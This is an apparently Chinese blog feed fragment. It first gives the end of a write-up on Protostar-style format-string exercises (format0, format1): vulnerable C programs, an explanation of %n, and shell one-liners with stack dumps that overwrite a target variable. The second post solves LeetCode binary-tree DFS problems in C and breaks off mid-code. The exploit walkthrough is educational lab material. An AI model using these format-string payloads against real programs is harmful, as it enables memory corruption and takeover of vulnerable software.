class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *<span class="hljs-built_in">string</span>)</span>  <br>&#123;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> target;<span class="hljs-comment">//遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问；如果不使用valatile，则编译器将对所声明的语句进行优化</span><br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];<br><br>  target = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">sprintf</span>(buffer, <span class="hljs-built_in">string</span>);<br><br>  <span class="hljs-keyword">if</span>(target == <span class="hljs-number">0xdeadbeef</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have hit the target correctly :)\n&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>  <br>&#123;<br>  vuln(argv[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-思路-5"><a href="#1-思路-5" class="headerlink" title="1.思路"></a>1.思路</h4><p>这题很简单，由于target变量是volatile类型的，因此我们可以通过溢出写入buffer实现改变target的值为0xdeadbeef，进而通过本关。</p><h4 id="2-解答-7"><a href="#2-解答-7" class="headerlink" title="2.解答"></a>2.解答</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*64+&#x27;\xef\xbe\xad\xde&#x27;&quot;</span>|xargs ./format0<br></code></pre></td></tr></table></figure><p><img src="/images/format0.png"></p><h3 id="format1"><a href="#format1" class="headerlink" title="format1"></a>format1</h3><h4 id="0-代码-1"><a href="#0-代码-1" class="headerlink" title="0.代码"></a>0.代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> target;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *<span class="hljs-built_in">string</span>)</span>  <br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-built_in">string</span>);<br><br>  <span class="hljs-keyword">if</span>(target) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have modified the target :)\n&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>  <br>&#123;<br>  vuln(argv[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="1.分析"></a>1.分析</h4><p>简单简介下%n吧：<br>输出格式 %n 可以将所输出字符串的长度值赋绐一个变量, 见下例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> slen;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world%n&quot;</span>, &amp;slen);<br></code></pre></td></tr></table></figure><p>执行后变量slen被赋值为11。</p><p>再结合这道题的printf(string),其实这个跟printf(“%s”,string)是不一样的，问题就是出自这里，当格式化字符串后再加上%x的话会紧接着读取堆栈里面的内容。</p><p>首先获取变量target的地址：</p><p><strong>objdump -t .&#x2F;format1 | grep target</strong></p><p><strong>08049638 g         O .bss     00000004                            target</strong></p><p>然后在堆栈中寻找赋值的位置，用%x填充堆栈的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./format1 $(python -c <span class="hljs-string">&#x27;print &quot; \x38\x96\x04\x08aaaa&quot; + &quot;%x.&quot;*128+&quot;%x&quot;&#x27;</span>)<br>8aaaa804960c.bffffb58.8048469.b7fd8304.b7fd7ff4.bffffb58.8048435.bffffd1e.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbd8.b7eadc76.2.bffffc04.bffffc10.b7fe1848.bffffbc0.ffffffff.b7ffeff4.804824d.1.bffffbc0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbd8.67947b62.4ddacd72.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc04.8048450.8048440.b7ff1040.bffffbfc.b7fff8f8.2.bffffd14.bffffd1e.0.bffffea9.bffffeb9.bffffecd.bffffeee.bffffef7.bfffff0a.bfffff14.bfffff56.bfffff6a.bfffff81.bfffff92.bfffff9d.bfffffa5.bfffffb2.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcfb.1f.bffffff2.f.bffffd0b.0.0.0.0.30000000.5d2405bd.a30ecc31.c3589634.694178cf.363836.0.6f662f2e.74616d72.96380031.61610804.78256161<br></code></pre></td></tr></table></figure><p>发现目测在127的位置拥有a和十六进制\x38\x96\x04\x08，然后还有一定的偏移，于是我们调整一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./format1 $(python -c <span class="hljs-string">&#x27;print &quot; \x38\x96\x04\x08baaaa&quot; + &quot;%x.&quot;*127+&quot;%x&quot;&#x27;</span>)<br>8baaaa804960c.bffffb58.8048469.b7fd8304.b7fd7ff4.bffffb58.8048435.bffffd20.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbd8.b7eadc76.2.bffffc04.bffffc10.b7fe1848.bffffbc0.ffffffff.b7ffeff4.804824d.1.bffffbc0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbd8.f416f263.de584473.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc04.8048450.8048440.b7ff1040.bffffbfc.b7fff8f8.2.bffffd16.bffffd20.0.bffffea9.bffffeb9.bffffecd.bffffeee.bffffef7.bfffff0a.bfffff14.bfffff56.bfffff6a.bfffff81.bfffff92.bfffff9d.bfffffa5.bfffffb2.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcfb.1f.bffffff2.f.bffffd0b.0.0.0.0.8d000000.197d9fe4.4a8e05f0.3fbd86e9.69ee56d6.363836.0.2f2e0000.6d726f66.317461.8049638<br></code></pre></td></tr></table></figure><p>于是我们将最后一个位置写入字符串长度数据，把%x换成%n即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./format1 $(python -c <span class="hljs-string">&#x27;print &quot; \x38\x96\x04\x08baaaa&quot; + &quot;%x.&quot;*127+&quot;%n&quot;&#x27;</span>)<br>8baaaa804960c.bffffb58.8048469.b7fd8304.b7fd7ff4.bffffb58.8048435.bffffd20.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbd8.b7eadc76.2.bffffc04.bffffc10.b7fe1848.bffffbc0.ffffffff.b7ffeff4.804824d.1.bffffbc0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbd8.6c1c469e.4652f08e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc04.8048450.8048440.b7ff1040.bffffbfc.b7fff8f8.2.bffffd16.bffffd20.0.bffffea9.bffffeb9.bffffecd.bffffeee.bffffef7.bfffff0a.bfffff14.bfffff56.bfffff6a.bfffff81.bfffff92.bfffff9d.bfffffa5.bfffffb2.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffcfb.1f.bffffff2.f.bffffd0b.0.0.0.0.7e000000.431dc4f2.70f0c9f5.95269a88.6907b8e5.363836.0.2f2e0000.6d726f66.317461.you have modified the target :)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>堆栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-DFS</title>
    <link href="/blog/2020/03/05/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DFS/"/>
    <url>/blog/2020/03/05/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DFS/</url>
    
    <content type="html"><![CDATA[<p><strong>今天专门来复习+学习一下深度优先遍历算法，做一下oj题目。</strong></p><p><img src="/images/fj37.jpg"></p><span id="more"></span><p><strong>深度优先搜索算法</strong>（英语：Depth-First-Search，DFS）是一种用于遍历或搜索树或图的算法。沿着树的深度遍历树的节点，尽可能深的搜索树的分支。当节点v的所在边都己被探寻过，搜索将回溯到发现节点v的那条边的起始节点。这一过程一直进行到已发现从源节点可达的所有节点为止。如果还存在未被发现的节点，则选择其中一个作为源节点并重复以上过程，整个进程反复进行直到所有节点都被访问为止。属于盲目搜索。<br>深度优先搜索是图论中的经典算法，利用深度优先搜索算法可以产生目标图的相应拓扑排序表，利用拓扑排序表可以方便的解决很多相关的图论问题，如最大路径问题等等。</p><h2 id="1-验证二叉搜索树"><a href="#1-验证二叉搜索树" class="headerlink" title="1.验证二叉搜索树"></a>1.验证二叉搜索树</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p><p>假设一个二叉搜索树具有如下特征：</p><p>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p><p>示例 1:</p><p>输入:<br>    2<br>   &#x2F; <br>  1   3<br>输出: true</p><p>示例 2:</p><p>输入:<br>    5<br>   &#x2F; <br>  1   4<br>     &#x2F; <br>    3   6<br>输出: false<br>解释: 输入为: [5,1,4,null,null,3,6]。<br>根节点的值为 5 ，但是其右子节点值为 4 。</p><p>来源：<a href="https://leetcode-cn.com/problems/validate-binary-search-tree">https://leetcode-cn.com/problems/validate-binary-search-tree</a></p><h3 id="1-2思路分析"><a href="#1-2思路分析" class="headerlink" title="1.2思路分析"></a>1.2思路分析</h3><p>该题最显然的思路就是采用中序遍历递归调用算法，最开始是用的把所有节点值放进数组中，然后再检查数组是否有序，后来发现太占用内存和花费时间了，就改了一下，记录一次上次节点的值last，然后用last和当前遍历的节点比较即可，节约内存和缩小运行时间。</p><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs abnf">/**<br> * Definition for a binary tree node.<br> * struct TreeNode &#123;<br> *     int val<span class="hljs-comment">;</span><br> *     struct TreeNode *left<span class="hljs-comment">;</span><br> *     struct TreeNode *right<span class="hljs-comment">;</span><br> * &#125;<span class="hljs-comment">;</span><br> */<br><br>int flag<span class="hljs-comment">;</span><br>long int last <span class="hljs-comment">;</span><br>void findArray(struct TreeNode* root)&#123;<br>    if(root <span class="hljs-operator">=</span><span class="hljs-operator">=</span> NULL)&#123;<br>        return NULL<span class="hljs-comment">;</span><br>    &#125;<br>    findArray(root-&gt;left)<span class="hljs-comment">;</span><br>    if(last &gt;<span class="hljs-operator">=</span> root-&gt;val)<br>        flag <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    last <span class="hljs-operator">=</span> root-&gt;val<span class="hljs-comment">;</span><br>    findArray(root-&gt;right)<span class="hljs-comment">;</span><br>&#125;<br>bool isValidBST(struct TreeNode* root)&#123;<br>    last <span class="hljs-operator">=</span> -<span class="hljs-number">2147483649</span><span class="hljs-comment">;</span><br>    flag <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    findArray(root)<span class="hljs-comment">;</span><br>    if(flag <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">0</span>)<br>        return true<span class="hljs-comment">;</span><br>    else return false<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//再次优化版本</span><br><span class="hljs-type">long</span> <span class="hljs-type">int</span> last = <span class="hljs-number">-2147483649</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isValidBST</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root != <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!isValidBST1(root-&gt;left))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(last &gt;= root-&gt;val)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        last=root-&gt;val;<br>        <span class="hljs-keyword">if</span>(!isValidBST1(root-&gt;right))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-恢复二叉搜索树"><a href="#2-恢复二叉搜索树" class="headerlink" title="2.恢复二叉搜索树"></a>2.恢复二叉搜索树</h2><h3 id="2-1题目描述"><a href="#2-1题目描述" class="headerlink" title="2.1题目描述"></a>2.1题目描述</h3><p>二叉搜索树中的两个节点被错误地交换。</p><p>请在不改变其结构的情况下，恢复这棵树。</p><p>示例 1:</p><p>输入: [1,3,null,null,2]</p><p>   1<br>  &#x2F;<br> 3<br>  <br>   2</p><p>输出: [3,1,null,null,2]</p><p>   3<br>  &#x2F;<br> 1<br>  <br>   2</p><p>示例 2:</p><p>输入: [3,1,4,null,null,2]</p><p>  3<br> &#x2F; <br>1   4<br>   &#x2F;<br>  2</p><p>输出: [2,1,4,null,null,3]</p><p>  2<br> &#x2F; <br>1   4<br>   &#x2F;<br>  3</p><p>来源：<a href="https://leetcode-cn.com/problems/recover-binary-search-tree">https://leetcode-cn.com/problems/recover-binary-search-tree</a></p><h3 id="2-2思路分析"><a href="#2-2思路分析" class="headerlink" title="2.2思路分析"></a>2.2思路分析</h3><p>看到该题也是想到应该中序遍历，二叉排序树中序遍历结果应该是一个递增的数列，我们只需要记住两个错误的节点的指针就好啦，然后将这两个指针中的内容交换，即可恢复出正确的序列值。</p><h3 id="2-3代码"><a href="#2-3代码" class="headerlink" title="2.3代码"></a>2.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> flag;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">myfirst</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">mysecond</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">last</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">recoverTree</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span> &#123;<br>    myfirst = <span class="hljs-literal">NULL</span>;<br>    mysecond = <span class="hljs-literal">NULL</span>;<br>    last = <span class="hljs-literal">NULL</span>;<br>    flag = <span class="hljs-number">0</span>;<br>    midOrder(root);<br>    <span class="hljs-type">int</span> first;<br>    first = myfirst-&gt;val;<br>    myfirst-&gt;val = mysecond-&gt;val;<br>    mysecond-&gt;val = first;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">midOrder</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br>    midOrder(root-&gt;left);<br>    <span class="hljs-keyword">if</span> (last!=<span class="hljs-literal">NULL</span>&amp;&amp;root-&gt;val &lt; last-&gt;val&amp;&amp;flag == <span class="hljs-number">0</span>)&#123;<br>        flag = <span class="hljs-number">1</span>;<br>        myfirst = last;<br>        mysecond = root;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (last!=<span class="hljs-literal">NULL</span>&amp;&amp;root-&gt;val &lt; last-&gt;val&amp;&amp;flag == <span class="hljs-number">1</span>)&#123;<br>        flag = <span class="hljs-number">2</span>;<br>        mysecond = root;<br>    &#125;<br>    last = root;<br>    midOrder(root-&gt;right);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="3-相同的树"><a href="#3-相同的树" class="headerlink" title="3.相同的树"></a>3.相同的树</h2><h3 id="3-1题目描述"><a href="#3-1题目描述" class="headerlink" title="3.1题目描述"></a>3.1题目描述</h3><p>给定两个二叉树，编写一个函数来检验它们是否相同。</p><p>如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</p><p>示例 1:</p><p>输入:       </p><p> 1         1<br> &#x2F; \       &#x2F; <br>2   3     2   3</p><p>[1,2,3],   [1,2,3]</p><p>输出: true</p><p>示例 2:</p><p>输入:    </p><p> 1          1<br> &#x2F;           \</p><p>2             2</p><p>[1,2],     [1,null,2]</p><p>输出: false</p><p>示例 3:</p><p>输入:  1         1<br>          &#x2F; \       &#x2F; <br>         2   1     1   2</p><p>[1,2,1],   [1,1,2]</p><p>输出: false</p><p>来源：<a href="https://leetcode-cn.com/problems/same-tree">https://leetcode-cn.com/problems/same-tree</a></p><h3 id="3-2思路分析"><a href="#3-2思路分析" class="headerlink" title="3.2思路分析"></a>3.2思路分析</h3><p>使用递归算法遍历即可，比较相应的访问到的节点值是否相等，边界问题有点恶心，一定要注意到判断语句的边界问题，本身很简单，但是稍微不注意就错了。</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isSameTree</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* p, <span class="hljs-keyword">struct</span> TreeNode* q)</span>&#123;<br>    <span class="hljs-keyword">if</span>(p == <span class="hljs-literal">NULL</span> &amp;&amp; q == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p == <span class="hljs-literal">NULL</span> || q==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; q-&gt;left == <span class="hljs-literal">NULL</span>&amp;&amp;p-&gt;val == q-&gt;val &amp;&amp; p-&gt;right == <span class="hljs-literal">NULL</span> &amp;&amp; q-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p-&gt;val == q-&gt;val )&#123;<br>        <span class="hljs-keyword">return</span> isSameTree(p-&gt;left,q-&gt;left)&amp;&amp;isSameTree(p-&gt;right,q-&gt;right);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-二叉树最大深度"><a href="#4-二叉树最大深度" class="headerlink" title="4.二叉树最大深度"></a>4.二叉树最大深度</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>给定一个二叉树，找出其最大深度。</p><p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例：<br>给定二叉树 [3,9,20,null,null,15,7]，</p><p>  3</p><p> &#x2F; \</p><p>9  20<br>    &#x2F;  <br>  15   7</p><p>返回它的最大深度 3 。</p><p>来源：<a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree">https://leetcode-cn.com/problems/maximum-depth-of-binary-tree</a></p><h3 id="4-2思路分析"><a href="#4-2思路分析" class="headerlink" title="4.2思路分析"></a>4.2思路分析</h3><p>很简单，递归遍历即可，设置左右两个值，取最大的返回并加一。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)&#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">maxDepth</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> left_height = maxDepth(root-&gt;left);<br>        <span class="hljs-type">int</span> right_height = maxDepth(root-&gt;right);<br>        <span class="hljs-keyword">return</span> max(left_height, right_height) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-从前序与中序遍历序列构造二叉树"><a href="#5-从前序与中序遍历序列构造二叉树" class="headerlink" title="5.从前序与中序遍历序列构造二叉树"></a>5.从前序与中序遍历序列构造二叉树</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>根据一棵树的前序遍历与中序遍历构造二叉树。</p><p>注意:<br>你可以假设树中没有重复的元素。</p><p>例如，给出</p><p>前序遍历 preorder &#x3D; [3,9,20,15,7]<br>中序遍历 inorder &#x3D; [9,3,15,20,7]</p><p>返回如下的二叉树：</p><p>​    3</p><p>   &#x2F; <br>  9  20<br>    &#x2F;  <br>   15   7</p><p>来源：<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal">https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal</a></p><h3 id="5-2思路分析"><a href="#5-2思路分析" class="headerlink" title="5.2思路分析"></a>5.2思路分析</h3><p>先序遍历的顺序是 Root -&gt; Left -&gt; Right，这就能方便的从根开始构造一棵树。<br>首先，preorder 中的第一个元素一定是树的根，这个根又将 inorder 序列分成了左右两棵子树。现在我们只需要将先序遍历的数组中删除根元素，然后重复上面的过程处理左右两棵子树。</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 